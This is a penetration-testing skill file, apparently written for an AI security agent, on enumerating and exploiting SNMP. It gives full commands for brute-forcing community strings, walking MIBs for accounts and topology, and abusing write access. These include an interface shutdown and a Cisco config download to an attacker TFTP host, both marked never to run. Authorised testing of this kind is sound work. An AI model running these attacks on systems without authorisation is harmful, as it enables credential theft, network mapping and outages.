---
name: snmp
description: SNMP enumeration and exploitation covering community string guessing, MIB walking, write access abuse, and v1/v2c/v3 authentication weaknesses
---

# SNMP

Simple Network Management Protocol exposes device configuration, network topology, credentials, and operational state. Default or weak community strings remain pervasive — a single readable community string can map an entire network, and a writable one can reconfigure routing, disable interfaces, or extract credentials. SNMP v1/v2c send community strings in cleartext; v3 adds authentication and encryption but is frequently misconfigured.

## Attack Surface

**Ports**
- UDP 161 (agent — queries)
- UDP 162 (trap receiver — notifications)
- TCP 161/162 (less common but supported)

**Versions**
- v1: cleartext community string, no encryption, no message integrity
- v2c: cleartext community string, bulk operations, improved error handling
- v3: username/password authentication (MD5/SHA), optional encryption (DES/AES), but often deployed with `noAuthNoPriv` or weak credentials

**Common Targets**
- Network devices: routers, switches, firewalls, load balancers
- Printers and IoT devices
- UPS and environmental monitoring systems
- Servers with SNMP agents (Net-SNMP, Windows SNMP service)
- Managed PDUs and IPMI/BMC interfaces

## Reconnaissance

### Discovery

**Port Scanning**
```bash
# UDP scan for SNMP
nmap -sU -p 161,162 --open -T4 <target_range>

# With version detection
nmap -sU -p 161 -sV --script snmp-info <target>
```

**Broadcast/Multicast Discovery**
```bash
# Broadcast SNMP query (local subnet)
nmap -sU -p 161 --script snmp-brute --script-args snmp-brute.communitiesdb=/usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt <subnet>/24
```

### Community String Guessing

**Default Strings to Test**
```
public, private, community, snmpd, admin, default, monitor
read, write, secret, cisco, router, switch, internal
<hostname>, <domain>, <orgname>
```

**Automated Guessing**
```bash
# Nmap brute force
nmap -sU -p 161 --script snmp-brute <target>

# With custom wordlist
nmap -sU -p 161 --script snmp-brute --script-args snmp-brute.communitiesdb=communities.txt <target>

# onesixtyone — fast community string scanner
onesixtyone -c communities.txt -i targets.txt

# hydra
hydra -P communities.txt <target> snmp
```

**SNMPv3 User Enumeration**
```bash
# Enumerate valid usernames (timing difference on auth failure vs unknown user)
nmap -sU -p 161 --script snmp-v3-brute <target>
```

## Key Vulnerabilities

### Information Disclosure via MIB Walking

Once a valid read community string is found, walk the entire MIB tree:

```bash
# Full MIB walk
snmpwalk -v2c -c <community> <target>

# System information
snmpwalk -v2c -c <community> <target> 1.3.6.1.2.1.1    # sysDescr, sysName, sysLocation

# Network interfaces
snmpwalk -v2c -c <community> <target> 1.3.6.1.2.1.2    # ifTable

# Routing table
snmpwalk -v2c -c <community> <target> 1.3.6.1.2.1.4.21 # ipRouteTable

# ARP table
snmpwalk -v2c -c <community> <target> 1.3.6.1.2.1.4.22 # ipNetToMediaTable

# TCP connections
snmpwalk -v2c -c <community> <target> 1.3.6.1.2.1.6.13 # tcpConnTable

# Running processes (Unix)
snmpwalk -v2c -c <community> <target> 1.3.6.1.2.1.25.4  # hrSWRunTable

# Installed software
snmpwalk -v2c -c <community> <target> 1.3.6.1.2.1.25.6  # hrSWInstalledTable

# Storage/disk usage
snmpwalk -v2c -c <community> <target> 1.3.6.1.2.1.25.2  # hrStorageTable

# User accounts (Windows)
snmpwalk -v2c -c <community> <target> 1.3.6.1.4.1.77.1.2.25 # winUserTable
```

**High-Value OIDs**

| OID | Data |
|-----|------|
| `1.3.6.1.2.1.1.1.0` | System description (OS, version) |
| `1.3.6.1.2.1.1.5.0` | Hostname |
| `1.3.6.1.2.1.1.4.0` | Contact (often reveals admin info) |
| `1.3.6.1.2.1.1.6.0` | Location |
| `1.3.6.1.2.1.2.2` | Network interfaces (IPs, MACs, status) |
| `1.3.6.1.4.1.77.1.2.25` | Windows user accounts |
| `1.3.6.1.2.1.25.4.2.1.2` | Running processes |
| `1.3.6.1.2.1.6.13.1.3` | Listening TCP ports |

### Write Access Exploitation

If a write community string (`private`, `write`, etc.) is found:

> **Never execute the destructive SET commands below.** This is a hard prohibition on autonomous execution, not a request for approval — being in scope does not make an outage or a config exfiltration acceptable. The only SET an agent may issue is the benign `sysContact` change shown below, which must be restored afterwards. The destructive commands are documented so you can recognise and report the exposure; establish write access with `sysContact`, then report what the write community would permit. Do not demonstrate it.

**Safe Write Confirmation (autonomous)**

Write validation must leave the device exactly as it was found. Always capture the original value first and restore it immediately after confirming the write.

```bash
# 1. Capture the original sysContact as raw bytes. -Oqv strips the type prefix,
#    -Ob and the hex form avoid locale/display rewriting of the value.
ORIGINAL=$(snmpget -v2c -c <read_community> -Oqv <target> 1.3.6.1.2.1.1.4.0)
ORIGINAL_HEX=$(snmpget -v2c -c <read_community> -Oqvx <target> 1.3.6.1.2.1.1.4.0)

# 2. Confirm the captured value round-trips before touching anything.
#    If ORIGINAL is empty, is rendered as a hex dump, or is wrapped in display
#    quotes, it is NOT safe to replay as a string — use the hex form in step 4.

# 3. Benign validation: change sysContact to prove write access
snmpset -v2c -c <write_community> <target> 1.3.6.1.2.1.1.4.0 s "strix_write_test"

# 4. Confirm the change took effect (this is the evidence to report)
snmpget -v2c -c <read_community> <target> 1.3.6.1.2.1.1.4.0

# 5. Restore — mandatory, even if step 4 failed. Prefer the hex form, which is
#    byte-exact and immune to display formatting:
snmpset -v2c -c <write_community> <target> 1.3.6.1.2.1.1.4.0 x "$ORIGINAL_HEX"

# 6. Verify byte-for-byte restoration against the captured original
RESTORED_HEX=$(snmpget -v2c -c <read_community> -Oqvx <target> 1.3.6.1.2.1.1.4.0)
[ "$RESTORED_HEX" = "$ORIGINAL_HEX" ] || echo "RESTORE FAILED — surface to operator"
```

Restore with the hex form (`x "$ORIGINAL_HEX"`), not the display string. Net-SNMP renders values for humans: a value containing non-printable bytes comes back as a hex dump, and some builds wrap printable strings in quotes. Replaying that display output with `s` writes the formatting itself into the device as data — the exact case where a "benign" validation leaves the target modified.

If the original `sysContact` was empty, restore it to an empty string (`s ""`). If step 1 fails, do not proceed with the SET — you cannot restore what you did not capture. If step 6 reports a mismatch, stop and surface it immediately; do not continue testing with the device left in a modified state. Report the write finding with the evidence from step 4 and state that the value was restored and verified.

**Destructive Operations — document, never execute**
```bash
# ⚠️ REFERENCE ONLY — never run autonomously; causes an outage
# Disable an interface (causes outage)
snmpset -v2c -c <write_community> <target> 1.3.6.1.2.1.2.2.1.7.<if_index> i 2
```

**TFTP Configuration Download — Cisco (document, never execute)**
```bash
# ⚠️ REFERENCE ONLY — never run autonomously; exfiltrates sensitive configuration
# Trigger config backup to attacker TFTP server
snmpset -v2c -c <write_community> <target> 1.3.6.1.4.1.9.2.1.55.<attacker_ip> s running-config
```
This retrieves the full router configuration including enable passwords, VPN keys, and ACLs.

**Credential Extraction**
- Cisco running-config via TFTP contains cleartext or weakly encrypted passwords
- Net-SNMP extend scripts may expose credentials in process arguments
- SNMP v3 credentials stored in `/etc/snmp/snmpd.conf` readable via process/file MIBs

### SNMPv3 Weaknesses

**noAuthNoPriv Mode**
- v3 configured without authentication — equivalent to v1/v2c
- Test: `snmpwalk -v3 -l noAuthNoPriv -u <username> <target>`

**Weak Authentication**
- MD5 auth with short/default passwords
- No encryption (authNoPriv) — scoped PDU data visible on wire (note: authentication passwords are NOT transmitted in plaintext under authNoPriv; the HMAC-based auth protects credentials, but management data traversing the wire is unencrypted)
- DES encryption (known weak) instead of AES

**Username Enumeration**
- Different error responses for valid vs invalid usernames
- Default usernames: `initial`, `admin`, `root`, `snmpuser`, `monitor`

### SNMP Trap Abuse

**Unauthorized Trap Receiver**
- If trap community string is known, inject fake traps to monitoring systems
- Can trigger automated remediation workflows (restart services, failover)

**Trap Interception**
- v1/v2c traps contain community string in cleartext
- Capture on-wire to obtain valid community strings

## Testing Methodology

1. **Discover** — UDP scan for port 161/162 across target range
2. **Version detection** — Identify SNMP version(s) supported; check for v1/v2c cleartext
3. **Community brute force** — Test default and common strings; include hostname/domain variants
4. **Read enumeration** — Walk full MIB tree with valid read community; catalog exposed data
5. **Write test** — Check if read community also has write access; test with benign SET (sysContact)
6. **v3 assessment** — Test noAuthNoPriv, enumerate usernames, check auth/priv algorithms
7. **Network mapping** — Extract routing tables, ARP, interfaces to map internal network
8. **Credential harvest** — Look for passwords in process tables, config files, SNMP user tables
9. **Trap analysis** — Check trap receiver configuration; test for unauthorized trap injection

## Validation

1. **Community string confirmed** — Show successful snmpwalk output with the discovered community string; include sysDescr and sysName as proof
2. **Information disclosure** — Demonstrate specific sensitive data retrieved: user accounts, network topology, running processes, or credentials
3. **Write access** — Show successful snmpset changing a benign value (sysContact) and snmpget confirming the change, then restore the original value and confirm the restoration. **Never modify operational parameters (interfaces, routes) — report the exposure instead of demonstrating it**
4. **v3 weakness** — Show noAuthNoPriv access or successful auth with weak/default credentials
5. Provide exact commands used and sanitized output

## False Positives

- SNMP agent responds but MIB tree contains only generic system info with no sensitive data
- Community string works but ACLs restrict accessible OIDs to non-sensitive subtrees
- v3 with authPriv (AES) and strong passwords — brute force unsuccessful and properly configured
- SNMP port open but only accepts connections from specific management IPs (ACL-filtered)
- Write community exists but snmpset is restricted by view-based access control (VACM)

## Impact

- **Network topology disclosure** — Routing tables, ARP caches, and interface lists reveal internal network architecture
- **Credential extraction** — Router configs (via TFTP), process arguments, and user tables expose passwords
- **Device reconfiguration** — Write access enables interface shutdown, route manipulation, ACL modification
- **Lateral movement** — Discovered internal IPs, subnets, and VPN configurations enable pivoting
- **Monitoring subversion** — Fake trap injection triggers false alerts or malicious automated responses
- **Compliance violation** — SNMP v1/v2c cleartext on a network violates PCI DSS, HIPAA, and most security frameworks

## Tooling

The Strix sandbox includes `nmap` (with NSE scripts). Additional tools may need installation:

```bash
# Net-SNMP tools (snmpwalk, snmpset, snmpget, snmpbulkwalk)
apt-get install -y snmp

# onesixtyone — fast community string scanner
apt-get install -y onesixtyone

# hydra — required for the `hydra -P communities.txt <target> snmp` example above
apt-get install -y hydra

# Community string wordlists
# SecLists: /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt
# If not available, use nmap's built-in snmp-brute script (no external wordlist needed)
```

Prefer `nmap` NSE scripts (`snmp-brute`, `snmp-info`, `snmp-v3-brute`) as the primary approach since they require no additional installation.

## Pro Tips

1. Always test UDP — SNMP is primarily UDP; TCP-only scans miss it entirely
2. Try the hostname and domain name as community strings — admins frequently use these
3. On Cisco devices, a valid write community + TFTP can extract the entire running configuration including secrets
4. Windows SNMP service with default `public` community exposes user accounts, installed software, and services
5. Check for SNMP on non-standard ports — some devices use 1161, 10161, or other alternatives
6. Net-SNMP `extend` directives execute arbitrary commands and expose output via SNMP — check `nsExtendTable` (OID `1.3.6.1.4.1.8072.1.3.2`)
7. In segmented networks, SNMP from a compromised host can map subnets the attacker can't directly reach

## Summary

SNMP v1/v2c with default community strings remains one of the most reliable network-layer findings. A single valid community string yields system details, network topology, and often credentials. Write access enables device reconfiguration and config extraction. Upgrade to v3 with authPriv (SHA+AES), use strong unique passwords, restrict SNMP access via ACLs, and disable v1/v2c entirely.
